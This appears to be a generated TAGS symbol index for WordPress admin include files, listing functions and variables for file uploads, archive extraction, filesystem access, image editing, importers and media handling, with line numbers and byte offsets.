		$home_path = substr($_SERVER["SCRIPT_FILENAME"], 0, $pos);home_path85,2980
		$home_path = trailingslashit( $home_path );home_path86,3041
		$home_path = ABSPATH;home_path88,3097
 * If the $file is index.php or .htaccess this function will assume it is relativewill97,3223
function get_real_file_to_edit( $file ) {get_real_file_to_edit108,3690
		$real_file = get_home_path() . $file;real_file110,3786
		$real_file = WP_CONTENT_DIR . $file;real_file112,3836
function list_files( $folder = '', $levels = 100 ) {list_files128,4308
function list_files( $folder = '', $levels = 100 ) {folder128,4308
	$files = array();files135,4436
	if ( $dir = @opendir( $folder ) ) {dir136,4455
				$files2 = list_files( $folder . '/' . $file, $levels - 1);files2141,4645
					$files = array_merge($files, $files2 );files143,4727
 * Please note that the calling function must unlink() this itself.must157,4981
function wp_tempnam($filename = '', $dir = '') {wp_tempnam168,5468
function wp_tempnam($filename = '', $dir = '') {dir168,5468
		$dir = get_temp_dir();dir170,5537
	$filename = basename($filename);filename171,5562
		$filename = time();filename173,5621
	$filename = preg_replace('|\..*$|', '.tmp', $filename);filename175,5644
	$filename = $dir . wp_unique_filename($dir, $filename);filename176,5701
function validate_file_to_edit( $file, $allowed_files = '' ) {validate_file_to_edit194,6187
function validate_file_to_edit( $file, $allowed_files = '' ) {allowed_files194,6187
	$code = validate_file( $file, $allowed_files );code195,6250
 * @param array $file Reference to a single element of $_FILES. Call the function once for each uploaded file.once226,7133
function wp_handle_upload( &$file, $overrides = false, $time = null ) {wp_handle_upload230,7580
function wp_handle_upload( &$file, $overrides = false, $time = null ) {overrides230,7580
		function wp_handle_upload_error( &$file, $message ) {wp_handle_upload_error233,7739
	$file = apply_filters( 'wp_handle_upload_prefilter', $file );file238,7841
	// You may define your own function and pass the name in $overrides['upload_error_handler']and240,7905
	$upload_error_handler = 'wp_handle_upload_error';upload_error_handler241,7998
	// You may define your own function and pass the name in $overrides['unique_filename_callback']and247,8307
	$unique_filename_callback = null;unique_filename_callback248,8404
	$action = 'wp_handle_upload';action251,8528
	$upload_error_strings = array( false,upload_error_strings254,8666
	$test_form = true;test_form265,9206
	$test_size = true;test_size266,9226
	$test_upload = true;test_upload267,9246
	$test_type = true;test_type270,9331
	$mimes = false;mimes271,9351
			$error_msg = __( 'File is empty. Please upload something more substantial.' );error_msg288,10057
			$error_msg = __( 'File is empty. Please upload something more substantial. This error could also be caused by uploads being disabled in your php.ini or by post_max_size being defined as smaller than upload_max_filesize in php.ini.' );error_msg290,10146
		$wp_filetype = wp_check_filetype_and_ext( $file['tmp_name'], $file['name'], $mimes );wp_filetype300,10833
			$ext = ltrim(strrchr($file['name'], '.'), '.');ext312,11316
			$type = $file['type'];type315,11384
		$type = '';type317,11420
	if ( ! ( ( $uploads = wp_upload_dir($time) ) && false === $uploads['error'] ) )uploads321,11531
	$filename = wp_unique_filename( $uploads['path'], $file['name'], $unique_filename_callback );filename324,11688
	$new_file = $uploads['path'] . "/$filename";new_file327,11821
	$stat = stat( dirname( $new_file ));stat332,12094
	$perms = $stat['mode'] & 0000666;perms333,12132
	$url = $uploads['url'] . "/$filename";url337,12219
function wp_handle_sideload( &$file, $overrides = false ) {wp_handle_sideload362,13342
function wp_handle_sideload( &$file, $overrides = false ) {overrides362,13342
		function wp_handle_upload_error( &$file, $message ) {wp_handle_upload_error365,13488
	// You may define your own function and pass the name in $overrides['upload_error_handler']and370,13590
	$upload_error_handler = 'wp_handle_upload_error';upload_error_handler371,13683
	// You may define your own function and pass the name in $overrides['unique_filename_callback']and373,13735
	$unique_filename_callback = null;unique_filename_callback374,13832
	$action = 'wp_handle_sideload';action377,13956
	$upload_error_strings = array( false,upload_error_strings380,14096
	$test_form = true;test_form391,14671
	$test_size = true;test_size392,14691
	$test_type = true;test_type395,14774
	$mimes = false;mimes396,14794
		$wp_filetype = wp_check_filetype_and_ext( $file['tmp_name'], $file['name'], $mimes );wp_filetype420,15980
			$ext = ltrim(strrchr($file['name'], '.'), '.');ext432,16448
			$type = $file['type'];type435,16516
	if ( ! ( ( $uploads = wp_upload_dir() ) && false === $uploads['error'] ) )uploads439,16639
	$filename = wp_unique_filename( $uploads['path'], $file['name'], $unique_filename_callback );filename442,16776
	$filename = str_replace('?','-', $filename);filename445,16901
	$filename = str_replace('&','-', $filename);filename446,16947
	$new_file = $uploads['path'] . "/$filename";new_file449,17031
	$stat = stat( dirname( $new_file ));stat455,17297
	$perms = $stat['mode'] & 0000666;perms456,17335
	$url = $uploads['url'] . "/$filename";url460,17422
	$return = apply_filters( 'wp_handle_upload', array( 'file' => $new_file, 'url' => $url, 'type' => $type ), 'sideload' );return462,17463
 * Please note, That the calling function must unlink() the file.must469,17687
function download_url( $url, $timeout = 300 ) {download_url477,17991
function download_url( $url, $timeout = 300 ) {timeout477,17991
	$tmpfname = wp_tempnam($url);tmpfname482,18208
	$response = wp_remote_get( $url, array( 'timeout' => $timeout, 'stream' => true, 'filename' => $tmpfname ) );response486,18339
function unzip_file($file, $to) {unzip_file514,19355
	$needed_dirs = array();needed_dirs523,19700
	$to = trailingslashit($to);to524,19725
		$path = preg_split('![/\\\]!', untrailingslashit($to));path528,19899
		for ( $i = count($path); $i >= 0; $i-- ) {i529,19957
			$dir = implode('/', array_slice($path, 0, $i+1) );dir533,20044
		$result = _unzip_file_ziparchive($file, $to, $needed_dirs);result545,20467
 * This function should not be called directly, use unzip_file instead. Attempts to unzip an archive using the ZipArchive class.should558,20865
function _unzip_file_ziparchive($file, $to, $needed_dirs = array() ) {_unzip_file_ziparchive570,21398
function _unzip_file_ziparchive($file, $to, $needed_dirs = array() ) {needed_dirs570,21398
	$z = new ZipArchive();z573,21494
	$zopen = $z->open($file, /* ZIPARCHIVE::CHECKCONS */ 4);zopen576,21574
	for ( $i = 0; $i < $z->numFiles; $i++ ) {i580,21733
		if ( ! $info = $z->statIndex($i) )info581,21776
	$needed_dirs = array_unique($needed_dirs);needed_dirs593,22204
		$parent_folder = dirname($dir);parent_folder601,22607
			$parent_folder = dirname($parent_folder);parent_folder604,22801
	for ( $i = 0; $i < $z->numFiles; $i++ ) {i616,23232
		if ( ! $info = $z->statIndex($i) )info617,23275
		$contents = $z->getFromIndex($i);contents626,23592
 * This function should not be called directly, use unzip_file instead. Attempts to unzip an archive using the PclZip library.should640,23975
function _unzip_file_pclzip($file, $to, $needed_dirs = array()) {_unzip_file_pclzip652,24506
function _unzip_file_pclzip($file, $to, $needed_dirs = array()) {needed_dirs652,24506
		$previous_encoding = mb_internal_encoding();previous_encoding657,24822
	$archive = new PclZip($file);archive663,24975
	$archive_files = $archive->extract(PCLZIP_OPT_EXTRACT_AS_STRING);archive_files665,25007
	$needed_dirs = array_unique($needed_dirs);needed_dirs685,25758
		$parent_folder = dirname($dir);parent_folder693,26161
			$parent_folder = dirname($parent_folder);parent_folder696,26355
function copy_dir($from, $to, $skip_list = array() ) {copy_dir733,27635
function copy_dir($from, $to, $skip_list = array() ) {skip_list733,27635
	$dirlist = $wp_filesystem->dirlist($from);dirlist736,27715
	$from = trailingslashit($from);from738,27760
	$to = trailingslashit($to);to739,27793
	$skip_regex = '';skip_regex741,27823
	foreach ( (array)$skip_list as $key => $skip_file )key742,27842
		$skip_regex = '!(' . rtrim($skip_regex, '|') . ')$!i';skip_regex746,27976
	foreach ( (array) $dirlist as $filename => $fileinfo ) {filename748,28034
			$result = copy_dir($from . $filename, $to . $filename, $skip_list);result765,28865
 * This function will include the chosen transport and attempt connecting.will775,29089
 * @param string $context (optional) Context for get_filesystem_method(), See function declaration for more information.declaration782,29435
function WP_Filesystem( $args = false, $context = false ) {WP_Filesystem785,29613
function WP_Filesystem( $args = false, $context = false ) {args785,29613
	$method = get_filesystem_method($args, $context);method790,29774
		$abstraction_file = apply_filters('filesystem_method_file', ABSPATH . 'wp-admin/includes/class-wp-filesystem-' . $method . '.php', $method);abstraction_file796,29911
	$method = "WP_Filesystem_$method";method802,30146
	$wp_filesystem = new $method($args);wp_filesystem804,30183
		define('FS_CONNECT_TIMEOUT', 30);FS_CONNECT_TIMEOUT808,30405
		define('FS_TIMEOUT', 30);FS_TIMEOUT810,30473
		define('FS_CHMOD_DIR', 0755 );FS_CHMOD_DIR820,30793
		define('FS_CHMOD_FILE', 0644 );FS_CHMOD_FILE822,30861
 * Note that the return value of this function can be overridden in 2 wayscan831,31086
 * Plugins may also define a custom transport handler, See the WP_Filesystem function for more information.for835,31346
function get_filesystem_method($args = array(), $context = false) {get_filesystem_method843,31691
function get_filesystem_method($args = array(), $context = false) {context843,31691
	$method = defined('FS_METHOD') ? FS_METHOD : false; //Please ensure that this is either 'direct', 'ssh', 'ftpext' or 'ftpsockets'method844,31759
			$context = WP_CONTENT_DIR;context848,31992
		$context = trailingslashit($context);context849,32022
		$temp_file_name = $context . 'temp-write-test-' . time();temp_file_name850,32062
		$temp_handle = @fopen($temp_file_name, 'w');temp_handle851,32122
				$method = 'direct';method854,32245
	if ( ! $method && isset($args['connection_type']) && 'ssh' == $args['connection_type'] && extension_loaded('ssh2') && function_exists('stream_get_contents') ) $method = 'ssh2';method860,32333
	if ( ! $method && extension_loaded('ftp') ) $method = 'ftpext';method861,32511
	if ( ! $method && ( extension_loaded('sockets') || function_exists('fsockopen') ) ) $method = 'ftpsockets'; //Sockets: Socket extension; PHP Mode: FSockopen / fwrite / freadmethod862,32576
function request_filesystem_credentials($form_post, $type = '', $error = false, $context = false, $extra_fields = null) {request_filesystem_credentials883,33747
function request_filesystem_credentials($form_post, $type = '', $error = false, $context = false, $extra_fields = null) {type883,33747
	$req_cred = apply_filters( 'request_filesystem_credentials', '', $form_post, $type, $error, $context, $extra_fields );req_cred884,33869
		$type = get_filesystem_method(array(), $context);type889,34056
		$extra_fields = array( 'version', 'locale' );extra_fields895,34184
	$credentials = get_option('ftp_credentials', array( 'hostname' => '', 'username' => ''));credentials897,34233
		$stored_credentials = $credentials;stored_credentials933,36551
	$hostname = '';hostname941,36989
	$username = '';username942,37006
	$password = '';password943,37023
	$connection_type = '';connection_type944,37040
		$error_string = __('<strong>ERROR:</strong> There was an error connecting to the server, Please verify the settings are correct.');error_string948,37151
			$error_string = esc_html( $error->get_error_message() );error_string950,37314
	$types = array();types954,37455
	$types = apply_filters('fs_ftp_connection_types', $types, $credentials, $type, $error, $context);types962,37805
	$label_user = __('Username');label_user983,38333
	$label_pass = __('Password');label_pass984,38364
			$label_user = __('FTP/SSH Username');label_user990,38651
			$label_pass = __('FTP/SSH Password');label_pass991,38692
			$label_user = __('FTP Username');label_user994,38800
			$label_pass = __('FTP Password');label_pass995,38837
	$disabled = disabled( (defined('FTP_SSL') && FTP_SSL) || (defined('FTP_SSH') && FTP_SSH), true, false );disabled1034,40886
	foreach ( $types as $name => $text ) : ?>name1035,40992

wordpress/wp-admin/includes/image-edit.php,8104
function wp_image_editor($post_id, $msg = false) {wp_image_editor9,96
function wp_image_editor($post_id, $msg = false) {msg9,96
	$nonce = wp_create_nonce("image_editor-$post_id");nonce10,147
	$meta = wp_get_attachment_metadata($post_id);meta11,199
	$thumb = image_get_intermediate_size($post_id, 'thumbnail');thumb12,246
	$sub_sizes = isset($meta['sizes']) && is_array($meta['sizes']);sub_sizes13,308
	$note = '';note14,373
		$big = max( $meta['width'], $meta['height'] );big17,436
	$sizer = $big > 400 ? 400 / $big : 1;sizer21,563
	$backup_sizes = get_post_meta( $post_id, '_wp_attachment_backup_sizes', true );backup_sizes23,603
	$can_restore = !empty($backup_sizes) && isset($backup_sizes['full-orig'])can_restore24,684
			$note = "<div class='error'><p>$msg->error</p></div>";note29,871
			$note = "<div class='updated'><p>$msg->msg</p></div>";note31,959
		$note_gdlib = esc_attr__('Image rotation is not supported by your web host (function imagerotate() is missing)');note_gdlib47,1799
		$thumb_img = wp_constrain_dimensions( $thumb['width'], $thumb['height'], 160, 120 );thumb_img158,8844
function wp_stream_image($image, $mime_type, $post_id) {wp_stream_image200,10739
	$image = apply_filters('image_save_pre', $image, $post_id);image201,10796
function wp_save_image_file($filename, $image, $mime_type, $post_id) {wp_save_image_file218,11188
	$image = apply_filters('image_save_pre', $image, $post_id);image219,11259
	$saved = apply_filters('wp_save_image_file', null, $filename, $image, $mime_type, $post_id);saved220,11320
function _image_get_preview_ratio($w, $h) {_image_get_preview_ratio236,11747
	$max = max($w, $h);max237,11791
function _rotate_image_resource($img, $angle) {_rotate_image_resource241,11854
		$rotated = imagerotate($img, $angle, 0);rotated243,11943
			$img = $rotated;img246,12042
function _flip_image_resource($img, $horz, $vert) {_flip_image_resource252,12086
	$w = imagesx($img);w253,12138
	$h = imagesy($img);h254,12159
	$dst = wp_imagecreatetruecolor($w, $h);dst255,12180
		$sx = $vert ? ($w - 1) : 0;sx257,12249
		$sy = $horz ? ($h - 1) : 0;sy258,12279
		$sw = $vert ? -$w : $w;sw259,12309
		$sh = $horz ? -$h : $h;sh260,12335
			$img = $dst;img264,12461
function _crop_image_resource($img, $x, $y, $w, $h) {_crop_image_resource270,12501
	$dst = wp_imagecreatetruecolor($w, $h);dst271,12555
			$img = $dst;img275,12702
function image_edit_apply_changes($img, $changes) {image_edit_apply_changes281,12742
	foreach ( $changes as $key => $obj ) {key287,12868
		$filtered = array($changes[0]);filtered306,13290
		for ( $i = 0, $j = 1; $j < count($changes); $j++ ) {i307,13324
			$combined = false;combined308,13379
						$combined = true;combined313,13563
						$combined = true;combined317,13667
		$changes = $filtered;changes324,13776
	$img = apply_filters('image_edit_before_change', $img, $changes);img329,13871
					$img = _rotate_image_resource($img, $operation->angle);img335,14061
					$img = _flip_image_resource($img, ($operation->axis & 1) != 0, ($operation->axis & 2) != 0);img339,14182
				$sel = $operation->sel;sel342,14307
				$scale = 1 / _image_get_preview_ratio( imagesx($img), imagesy($img) ); // discard preview scalingscale343,14335
				$img = _crop_image_resource($img, $sel->x * $scale, $sel->y * $scale, $sel->w * $scale, $sel->h * $scale);img344,14437
function stream_preview_image($post_id) {stream_preview_image352,14584
	$post = get_post($post_id);post353,14626
	$img = load_image_to_edit( $post_id, $post->post_mime_type, array(400, 400) );img355,14744
	$changes = !empty($_REQUEST['history']) ? json_decode( stripslashes($_REQUEST['history']) ) : null;changes360,14869
		$img = image_edit_apply_changes($img, $changes);img362,14987
	$w = imagesx($img);w365,15059
	$h = imagesy($img);h366,15080
	$ratio = _image_get_preview_ratio($w, $h);ratio367,15101
	$w2 = $w * $ratio;w2368,15145
	$h2 = $h * $ratio;h2369,15165
	$preview = wp_imagecreatetruecolor($w2, $h2);preview371,15186
function wp_restore_image($post_id) {wp_restore_image380,15427
	$meta = wp_get_attachment_metadata($post_id);meta381,15465
	$file = get_attached_file($post_id);file382,15512
	$backup_sizes = get_post_meta( $post_id, '_wp_attachment_backup_sizes', true );backup_sizes383,15550
	$restored = false;restored384,15631
	$msg = new stdClass;msg385,15651
	$parts = pathinfo($file);parts392,15779
	$suffix = time() . rand(100, 999);suffix393,15806
	$default_sizes = get_intermediate_image_sizes();default_sizes394,15842
		$data = $backup_sizes['full-orig'];data397,15977
					$delpath = apply_filters('wp_delete_file', $file);delpath403,16234
		$restored_file = path_join($parts['dirname'], $data['file']);restored_file411,16471
		$restored = update_attached_file($post_id, $restored_file);restored412,16535
			$data = $backup_sizes["$default_size-orig"];data423,17000
						$delpath = apply_filters( 'wp_delete_file', path_join($parts['dirname'], $meta['sizes'][$default_size]['file']) );delpath428,17347
function wp_save_image($post_id) {wp_save_image455,18060
	$return = new stdClass;return456,18095
	$success = $delete = $scaled = $nocrop = false;success457,18120
	$post = get_post($post_id);post458,18169
	$img = load_image_to_edit($post_id, $post->post_mime_type);img460,18287
	$fwidth = !empty($_REQUEST['fwidth']) ? intval($_REQUEST['fwidth']) : 0;fwidth467,18464
	$fheight = !empty($_REQUEST['fheight']) ? intval($_REQUEST['fheight']) : 0;fheight468,18538
	$target = !empty($_REQUEST['target']) ? preg_replace('/[^a-z0-9_-]+/i', '', $_REQUEST['target']) : '';target469,18615
	$scale = !empty($_REQUEST['do']) && 'scale' == $_REQUEST['do'];scale470,18719
		$sX = imagesx($img);sX473,18833
		$sY = imagesy($img);sY474,18856
		$diff = round($sX / $sY, 2) - round($fwidth / $fheight, 2);diff477,18930
			$dst = wp_imagecreatetruecolor($fwidth, $fheight);dst480,19063
				$img = $dst;img483,19227
				$scaled = true;scaled484,19244
		$changes = json_decode( stripslashes($_REQUEST['history']) );changes493,19474
			$img = image_edit_apply_changes($img, $changes);img495,19556
	$meta = wp_get_attachment_metadata($post_id);meta501,19720
	$backup_sizes = get_post_meta( $post->ID, '_wp_attachment_backup_sizes', true );backup_sizes502,19767
		$backup_sizes = array();backup_sizes510,20023
	$path = get_attached_file($post_id);path513,20077
	$path_parts = pathinfo( $path );path_parts514,20115
	$filename = $path_parts['filename'];filename515,20149
	$suffix = time() . rand(100, 999);suffix516,20187
			$new_path = "{$path_parts['dirname']}/{$filename}-temp.{$path_parts['extension']}";new_path522,20427
			$new_path = $path;new_path524,20521
			$filename = preg_replace( '/-e([0-9]+)$/', '', $filename );filename527,20571
			$new_filename = "{$filename}.{$path_parts['extension']}";new_filename529,20665
			$new_path = "{$path_parts['dirname']}/$new_filename";new_path530,20726
		$tag = false;tag545,21166
				$tag = "full-$suffix";tag548,21364
			$tag = 'full-orig';tag550,21402
		$success = update_attached_file($post_id, $new_path);success556,21568
			$sizes = get_intermediate_image_sizes();sizes566,21980
				$sizes = array_diff( $sizes, array('thumbnail') );sizes568,22055
		$sizes = array( 'thumbnail' );sizes574,22219
		$success = $delete = $nocrop = true;success575,22252
			$tag = false;tag580,22351
						$tag = "$size-$suffix";tag584,22603
					$tag = "$size-orig";tag586,22646
			$crop = $nocrop ? false : get_option("{$size}_crop");crop593,22751
			$resized = image_make_intermediate_size($new_path, get_option("{$size}_size_w"), get_option("{$size}_size_h"), $crop );resized594,22808
		if ( $target == 'thumbnail' || $target == 'all' || $target == 'full' ) {target607,23186
			$file_url = wp_get_attachment_url($post_id);file_url608,23261
			if ( $thumb = $meta['sizes']['thumbnail'] )thumb609,23309
		$delete = true;delete615,23502
		$delpath = apply_filters('wp_delete_file', $new_path);delpath619,23542

wordpress/wp-admin/includes/image.php,4825
 * This function can handle most image file formats which PHP supports. If PHPcan12,210
function wp_create_thumbnail( $file, $max_side, $deprecated = '' ) {wp_create_thumbnail23,689
function wp_create_thumbnail( $file, $max_side, $deprecated = '' ) {deprecated23,689
	$thumbpath = image_resize( $file, $max_side, $max_side );thumbpath26,835
function wp_crop_image( $src, $src_x, $src_y, $src_w, $src_h, $dst_w, $dst_h, $src_abs = false, $dst_file = false ) {wp_crop_image46,1595
function wp_crop_image( $src, $src_x, $src_y, $src_w, $src_h, $dst_w, $dst_h, $src_abs = false, $dst_file = false ) {src_abs46,1595
		$src_file = get_attached_file( $src );src_file48,1773
			$post = get_post( $src );post52,1982
			$image_type = $post->post_mime_type;image_type53,2011
			$src = load_image_to_edit( $src, $post->post_mime_type, 'full' );src54,2051
			$size = @getimagesize( $src_file );size56,2131
			$image_type = ( $size ) ? $size['mime'] : '';image_type57,2170
			$src = wp_load_image( $src_file );src58,2219
		$size = @getimagesize( $src );size61,2271
		$image_type = ( $size ) ? $size['mime'] : '';image_type62,2304
		$src = wp_load_image( $src );src63,2352
	$dst = wp_imagecreatetruecolor( $dst_w, $dst_h );dst69,2484
		$dst_file = str_replace( basename( $src_file ), 'cropped-' . basename( $src_file ), $src_file );dst_file84,2828
		$dst_file = preg_replace( '/\\.[^\\.]+$/', '.jpg', $dst_file );dst_file87,2963
	$dst_file = dirname( $dst_file ) . '/' . wp_unique_filename( dirname( $dst_file ), basename( $dst_file ) );dst_file93,3172
function wp_generate_attachment_metadata( $attachment_id, $file ) {wp_generate_attachment_metadata112,3739
	$attachment = get_post( $attachment_id );attachment113,3807
	$metadata = array();metadata115,3851
		$imagesize = getimagesize( $file );imagesize117,3978
		$sizes = apply_filters( 'intermediate_image_sizes_advanced', $sizes );sizes145,5377
		foreach ($sizes as $size => $size_data ) {size147,5451
			$resized = image_make_intermediate_size( $file, $size_data['width'], $size_data['height'], $size_data['crop'] );resized148,5496
		$image_meta = wp_read_image_metadata( $file );image_meta154,5724
function get_udims( $width, $height) {get_udims173,6210
function wp_exif_frac2dec($str) {wp_exif_frac2dec185,6429
function wp_exif_date2ts($str) {wp_exif_date2ts200,6678
function wp_read_image_metadata( $file ) {wp_read_image_metadata223,7465
	$meta = array(meta233,7911
			$iptc = iptcparse( $info['APP13'] );iptc252,8348
				$caption = utf8_encode( trim( $iptc['2#120'][0] ) );caption262,8841
		$exif = @exif_read_data( $file );exif289,9992
function file_is_valid_image($path) {file_is_valid_image342,12236
	$size = @getimagesize($path);size343,12274
function file_is_displayable_image($path) {file_is_displayable_image356,12609
	$info = @getimagesize($path);info357,12653
		$result = false;result359,12705
		$result = false;result361,12868
		$result = true;result363,12893
function load_image_to_edit( $attachment_id, $mime_type, $size = 'full' ) {load_image_to_edit378,13294
function load_image_to_edit( $attachment_id, $mime_type, $size = 'full' ) {size378,13294
	$filepath = _load_image_to_edit_path( $attachment_id, $size );filepath379,13370
			$image = imagecreatefromjpeg($filepath);image385,13524
			$image = imagecreatefrompng($filepath);image388,13598
			$image = imagecreatefromgif($filepath);image391,13671
			$image = false;image394,13735
		$image = apply_filters('load_image_to_edit', $image, $attachment_id, $size);image398,13797
function _load_image_to_edit_path( $attachment_id, $size = 'full' ) {_load_image_to_edit_path420,14524
function _load_image_to_edit_path( $attachment_id, $size = 'full' ) {size420,14524
	$filepath = get_attached_file( $attachment_id );filepath421,14594
		if ( 'full' != $size && ( $data = image_get_intermediate_size( $attachment_id, $size ) ) ) {data424,14693
			$filepath = apply_filters( 'load_image_to_edit_filesystempath', path_join( dirname( $filepath ), $data['file'] ), $attachment_id, $size );filepath425,14788
		$filepath = apply_filters( 'load_image_to_edit_attachmenturl', wp_get_attachment_url( $attachment_id ), $attachment_id, $size );filepath428,15049
function _copy_image_file( $attachment_id ) {_copy_image_file443,15469
	$dst_file = $src_file = get_attached_file( $attachment_id );dst_file444,15515
		$src_file = _load_image_to_edit_path( $attachment_id );src_file446,15612
		$dst_file = str_replace( basename( $dst_file ), 'copy-' . basename( $dst_file ), $dst_file );dst_file449,15691
		$dst_file = dirname( $dst_file ) . '/' . wp_unique_filename( dirname( $dst_file ), basename( $dst_file ) );dst_file450,15787
			$dst_file = false;dst_file457,16084
		$dst_file = false;dst_file459,16116

wordpress/wp-admin/includes/import.php,705
function get_importers() {get_importers16,190
function register_importer( $id, $name, $description, $callback ) {register_importer34,730
function wp_import_cleanup( $id ) {wp_import_cleanup50,1064
function wp_import_handle_upload() {wp_import_handle_upload61,1290
	$overrides = array( 'test_form' => false, 'test_type' => false );overrides67,1624
	$file = wp_handle_upload( $_FILES['import'], $overrides );file69,1729
	$url = $file['url'];url74,1839
	$type = $file['type'];type75,1861
	$file = $file['file'];file76,1885
	$filename = basename( $file );filename77,1909
	$object = array( 'post_title' => $filename,object80,1973
	$id = wp_insert_attachment( $object, $file );id89,2168

wordpress/wp-admin/includes/list-table.php,1489
 * @param string $class The type of the list table, which is the class name.name16,253
 * @return object|bool Object on success, false if the class does not exist.does17,330
function _get_list_table( $class ) {_get_list_table19,411
	$core_classes = array(core_classes20,448
function register_column_headers($screen, $columns) {register_column_headers57,1757
	$wp_list_table = new _WP_List_Table_Compat($screen, $columns);wp_list_table58,1811
function print_column_headers($screen, $id = true) {print_column_headers66,1955
function print_column_headers($screen, $id = true) {id66,1955
	$wp_list_table = new _WP_List_Table_Compat($screen);wp_list_table67,2008
 * Helper class to be used only by back compat functionsto73,2114
class _WP_List_Table_Compat extends WP_List_Table {_WP_List_Table_Compat77,2194
	var $_screen;_screen78,2246
	var $_columns;_columns79,2261
	function _WP_List_Table_Compat( $screen, $columns = array() ) {_WP_List_Table_Compat81,2278
	function _WP_List_Table_Compat( $screen, $columns = array() ) {columns81,2278
			$screen = convert_to_screen( $screen );screen83,2373
		$this->_screen = $screen;_screen85,2417
			$this->_columns = $columns;_columns88,2476
	function get_column_info() {get_column_info93,2605
		$columns = get_column_headers( $this->_screen );columns94,2635
		$hidden = get_hidden_columns( $this->_screen );hidden95,2686
		$sortable = array();sortable96,2736
	function get_columns() {get_columns101,2812

wordpress/wp-admin/includes/manifest.php,283
$man_version = md5( $tinymce_version . $manifest_version );man_version8,89
$mce_ver = "ver=$tinymce_version";mce_ver9,149
function &get_manifest() {get_manifest16,346
	$files = array(files19,392
	$mce = array(mce89,2993
	$files = array_merge($files, $mce);files197,10234

wordpress/wp-admin/includes/media.php,27423
function media_upload_tabs() {media_upload_tabs16,200
	$_default_tabs = array(_default_tabs17,231
function update_gallery_tab($tabs) {update_gallery_tab35,611
	$post_id = intval($_REQUEST['post_id']);post_id43,750
		$attachments = intval( $wpdb->get_var( $wpdb->prepare( "SELECT count(*) FROM $wpdb->posts WHERE post_type = 'attachment' AND post_status != 'trash' AND post_parent = %d", $post_id ) ) );attachments46,810
function the_media_upload_tabs() {the_media_upload_tabs64,1321
	$tabs = media_upload_tabs();tabs66,1376
	$default = 'type';default67,1406
			$current = $redir_tab;current72,1548
			$current = $_GET['tab'];current74,1648
			$current = apply_filters('media_upload_default_tab', $default);current76,1683
		foreach ( $tabs as $callback => $text ) {callback78,1751
			$class = '';class79,1795
			if ( $current == $callback )current81,1812
				$class = " class='current'";class82,1844
			$href = add_query_arg(array('tab' => $callback, 's' => false, 'paged' => false, 'post_mime_type' => false, 'm' => false));href84,1878
			$link = "<a href='" . esc_url($href) . "'$class>$text</a>";link85,2004
function get_image_send_to_editor($id, $caption, $title, $align, $url='', $rel = false, $size='medium', $alt = '') {get_image_send_to_editor106,2455
function get_image_send_to_editor($id, $caption, $title, $align, $url='', $rel = false, $size='medium', $alt = '') {url106,2455
	$html = get_image_tag($id, $alt, $title, $align, $size);html108,2573
	$rel = $rel ? ' rel="attachment wp-att-' . esc_attr($id).'"' : '';rel110,2632
		$html = '<a href="' . esc_attr($url) . "\"$rel>$html</a>";html113,2714
	$html = apply_filters( 'image_send_to_editor', $html, $id, $caption, $title, $align, $url, $size, $alt );html115,2776
function image_add_caption( $html, $id, $caption, $title, $align, $url, $size, $alt = '' ) {image_add_caption134,3194
function image_add_caption( $html, $id, $caption, $title, $align, $url, $size, $alt = '' ) {alt134,3194
	$id = ( 0 < (int) $id ) ? 'attachment_' . $id : '';id139,3372
	$width = $matches[1];width144,3508
	$caption = str_replace( array("\r\n", "\r"), "\n", $caption);caption146,3532
	$caption = preg_replace_callback( '/<[a-zA-Z0-9]+(?: [^<>]+>)*/', '_cleanup_image_add_caption', $caption );caption147,3595
	$caption = preg_replace( '/[ \n\t]*\n[ \t]*/', '<br />', $caption );caption149,3750
	$html = preg_replace( '/(class=["\'][^\'"]*)align(none|left|right|center)\s?/', '$1', $html );html151,3821
		$align = 'none';align153,3939
	$shcode = '[caption id="' . $id . '" align="align' . $align	. '" width="' . $width . '"]' . $html . ' ' . $caption . '[/caption]';shcode155,3959
function _cleanup_image_add_caption( $matches ) {_cleanup_image_add_caption167,4340
function media_send_to_editor($html) {media_send_to_editor179,4599
function media_handle_upload($file_id, $post_id, $post_data = array(), $overrides = array( 'test_form' => false )) {media_handle_upload204,5337
function media_handle_upload($file_id, $post_id, $post_data = array(), $overrides = array( 'test_form' => false )) {post_data204,5337
	$time = current_time('mysql');time206,5455
	if ( $post = get_post($post_id) ) {post207,5487
			$time = $post->post_date;time209,5570
	$name = $_FILES[$file_id]['name'];name212,5603
	$file = wp_handle_upload($_FILES[$file_id], $overrides, $time);file213,5639
	$name_parts = pathinfo($name);name_parts218,5793
	$name = trim( substr( $name, 0, -(1 + strlen($name_parts['extension'])) ) );name219,5825
	$url = $file['url'];url221,5904
	$type = $file['type'];type222,5926
	$file = $file['file'];file223,5950
	$title = $name;title224,5974
	$content = '';content225,5991
	if ( $image_meta = @wp_read_image_metadata($file) ) {image_meta228,6080
			$title = $image_meta['title'];title230,6231
			$content = $image_meta['caption'];content232,6305
	$attachment = array_merge( array(attachment236,6382
	$id = wp_insert_attachment($attachment, $file, $post_id);id249,6732
function media_handle_sideload($file_array, $post_id, $desc = null, $post_data = array()) {media_handle_sideload269,7415
function media_handle_sideload($file_array, $post_id, $desc = null, $post_data = array()) {desc269,7415
	$overrides = array('test_form'=>false);overrides270,7507
	$file = wp_handle_sideload($file_array, $overrides);file272,7549
	$url = $file['url'];url276,7691
	$type = $file['type'];type277,7713
	$file = $file['file'];file278,7737
	$title = preg_replace('/\.[^.]+$/', '', basename($file));title279,7761
	$content = '';content280,7820
	if ( $image_meta = @wp_read_image_metadata($file) ) {image_meta283,7909
			$title = $image_meta['title'];title285,8060
			$content = $image_meta['caption'];content287,8134
		$title = $desc;title291,8199
	$attachment = array_merge( array(attachment294,8253
	$id = wp_insert_attachment($attachment, $file, $post_id);id307,8618
 * etc any additional function args will be passed to content_func.args318,8936
function wp_iframe($content_func /* ... */) {wp_iframe324,9067
addLoadEvent = function(func){if(typeof jQuery!="undefined")jQuery(document).ready(func);else if(typeof wpOnload!='function'){wpOnload=func;}else{var oldonload=wpOnload;wpOnload=function(){oldonload();func();}}};addLoadEvent339,9624
var userSettings = {'url':'<?php echo SITECOOKIEPATH; ?>','uid':'<?php if ( ! isset($current_user) ) $current_user = wp_get_current_user(); echo $current_user->ID; ?>','time':'<?php echo time(); ?>'};current_user340,9837
	$args = func_get_args();args363,10853
	$args = array_slice($args, 1);args364,10879
function media_buttons($editor_id = 'content') {media_buttons380,11179
	$context = apply_filters('media_buttons_context', __('Upload/Insert %s'));context381,11228
	$img = '<img src="' . esc_url( admin_url( 'images/media-button.png?ver=20111005' ) ) . '" width="15" height="15" />';img383,11305
function _media_button($title, $icon, $type, $id) {_media_button389,11715
